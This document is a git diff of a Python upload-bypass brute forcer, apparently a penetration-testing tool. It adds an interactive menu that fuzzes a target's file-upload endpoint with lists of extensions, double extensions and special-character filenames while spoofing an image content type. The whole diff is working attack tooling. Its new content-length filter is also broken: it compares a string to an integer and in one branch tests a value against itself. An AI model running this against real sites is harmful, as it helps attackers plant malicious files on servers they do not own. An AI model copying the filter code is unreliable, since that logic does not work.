@@ -28,6 +28,7 @@ print("Example usage: python3 fileUploadBf.py -ext -c=d4t0jgvfjhdnn5aqt4tonnpq2j
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-v", "--verbose", help="increase output verbosity",action="store_true")
+parser.add_argument("-fl", "--filterContlength", help="increase output verbosity", nargs='?', const=1, type=str)
 parser.add_argument("-mb", "--mbytes", help="use magic bytes payload (JPEG)", action="store_true")
 parser.add_argument("-fct", "--fuzzCont", help="brute force the allowed content type of file upload", action="store_true")
 parser.add_argument("-ext", "--fileextension", help="brute force the allowed extension type of file upload", action="store_true")
@@ -43,11 +44,6 @@ args = parser.parse_args()
 
 
 
-
-
-
-
-
 ######################################################## content type
 with open('files/contType.txt','r') as handle:
     data = handle.readlines()
@@ -55,17 +51,6 @@ ContentTypes = []
 for contlist in data:
     ContentTypes.append(contlist.replace("\n",""))
 ######################################################## content type
-
-
-
-######################################################## extension list
-with open('files/double_extension_list.txt') as handle:
-    data1 = handle.readlines()
-fileExtensions = []
-for ext in data1:
-    fileExtensions.append(ext.replace("\n",""))
-
-
 
 
 
@@ -85,28 +70,124 @@ url = args.url
 
 
 if args.fileextension:
-    print("Bypassing extensions")
-    ####### content type fuzzing
     x = 0
+    print("Bypassing extensions")
 
-    for xtensions in fileExtensions:
-        ###### the 3rd param for the files should be change for the content-type/mime type automaticaly based on the last file type extension
-        files = {'file': (f'test{xtensions}', open('files/payloads/index.jpeg','rb'), 'image/png')}
+    inp = input("Select method \n1. Fuzz for available extension\n2. Use double extension\n3. 1 file extension with special characters\n4. 2 file extensions with special characters\n")
 
-        
+    if inp == "1":
+        print("using 1 Fuzzing for available extension")
+        ######################################################## extension list
+        with open('files/extensionLists.txt') as handle:
+            data1 = handle.readlines()
+            fileExtensions = []
+        for ext in data1:
+            fileExtensions.append(ext.replace("\n",""))
 
-        #values = {args.data}
+        for xtensions in fileExtensions:
+            ###### the 3rd param for the files should be change for the content-type/mime type automaticaly based on the last file type extension
+            files = {'file': (f'test{xtensions}', open('files/payloads/index.jpeg','rb'), 'image/png')}
+            #values = {args.data}
        
-        #response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
-        response = requests.post(url, files=files, data=values, cookies=cookies)
+            #response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
+            response = requests.post(url, files=files, data=values, cookies=cookies)
 
-        print(f"using: {xtensions}")
-        print(f"response code: {response}")
+            #filter cintent length
+            if args.filterContlength is not None:
 
-        print(f"content length: {len(response.content)} ")
-        print("----------------------------------------------")
+                if len(response.content) == args.filterContlength:
+                    print(x)
+                elif len(response.content) is not args.filterContlength:
+                    print(f"using: {xtensions}")
+                    print(f"response code: {response}")
+                    print(f"content length: {len(response.content)} ")
+                    print("----------------------------------------------")
+            # else:
+            #     # print(f"using: {xtensions}")
+            #     # print(f"response code: {response}")
 
-        x += 1
+            #     # print(f"content length: {len(response.content)} ")
+            #     # print("----------------------------------------------")
+            x += 1
+
+    elif inp == "2":
+        print("using 2 (double file extensions)")
+        ######################################################## extension list
+        with open('files/double_extension_list.txt') as handle:
+            data1 = handle.readlines()
+            fileExtensions = []
+        for ext in data1:
+            fileExtensions.append(ext.replace("\n",""))
+
+        for xtensions in fileExtensions:
+            ###### the 3rd param for the files should be change for the content-type/mime type automaticaly based on the last file type extension
+            files = {'file': (f'test{xtensions}', open('files/payloads/index.jpeg','rb'), 'image/png')}
+            #values = {args.data}
+       
+            response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
+            #response = requests.post(url, files=files, data=values, cookies=cookies)
+            if args.filterContlength is not None and args.filterContlength == args.filterContlength:
+                print(x)
+            else:
+                print(f"using: {xtensions}")
+                print(f"response code: {response}")
+
+                print(f"content length: {len(response.content)} ")
+                print("----------------------------------------------")
+
+            x += 1
+    elif inp == "3":
+        print("using 3 (1 file extenion with special characters)")
+        ######################################################## extension list
+        with open('files/1xtensions_specialcharacs.txt') as handle:
+            data1 = handle.readlines()
+            fileExtensions = []
+        for ext in data1:
+            fileExtensions.append(ext.replace("\n",""))
+
+        for xtensions in fileExtensions:
+            ###### the 3rd param for the files should be change for the content-type/mime type automaticaly based on the last file type extension
+            files = {'file': (f'test{xtensions}', open('files/payloads/index.jpeg','rb'), 'image/png')}
+            #values = {args.data}
+       
+            response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
+            #response = requests.post(url, files=files, data=values, cookies=cookies)
+
+            print(f"using: {xtensions}")
+            print(f"response code: {response}")
+
+            print(f"content length: {len(response.content)} ")
+            print("----------------------------------------------")
+
+            x += 1
+    elif inp == "4":
+        print("using 4 (2 file extensions with special characters)")
+        ######################################################## extension list
+        with open('files/2xtensions_specialcharacs.txt') as handle:
+            data1 = handle.readlines()
+            fileExtensions = []
+        for ext in data1:
+            fileExtensions.append(ext.replace("\n",""))
+
+        for xtensions in fileExtensions:
+            ###### the 3rd param for the files should be change for the content-type/mime type automaticaly based on the last file type extension
+            files = {'file': (f'test{xtensions}', open('files/payloads/index.jpeg','rb'), 'image/png')}
+            #values = {args.data}
+       
+            response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
+            #response = requests.post(url, files=files, data=values, cookies=cookies)
+
+            print(f"using: {xtensions}")
+            print(f"response code: {response}")
+
+            print(f"content length: {len(response.content)} ")
+            print("----------------------------------------------")
+
+            x += 1
+    else:
+        print("pick from the available choices")
+
+
 
 
 if args.fuzzCont:
